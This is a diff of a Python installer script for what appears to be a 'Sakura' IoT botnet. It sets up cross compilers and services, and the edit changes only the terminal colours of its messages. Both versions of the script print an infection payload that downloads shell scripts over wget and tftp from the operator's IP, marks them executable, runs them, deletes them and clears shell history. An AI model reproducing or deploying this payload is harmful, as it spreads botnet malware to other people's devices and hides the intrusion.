@@ -3,11 +3,11 @@ import subprocess, sys
 if len(sys.argv[2]) != 0:
     ip = sys.argv[2]
 else:
-    print("\x1b[1;95mIncorrect Usage!\x1b[0m")
+    print("\x1b[40;38;2;171;143;255mIncorrect Usage!\x1b[0m")
     exit(1)
 
 bot = sys.argv[1]
-Sakura= raw_input("\x1b[1;95mReady To Install Cross Compilers? (Press Enter): \x1b[0m")
+Sakura= raw_input("\x1b[40;38;2;171;143;255mReady To Install Cross Compilers? (Press Enter): \x1b[0m")
 if Sakura.lower() == "":
     get_arch = True
 else:
@@ -135,4 +135,4 @@ run("service xinetd restart")
 run("service httpd restart")
 run('echo -e "ulimit -n 99999" >> ~/.bashrc')
 #Made By Zinqo.
-print("\x1b[1;95mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c\x1b[0m")
+print("\x1b[40;38;2;171;143;255mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c\x1b[0m")
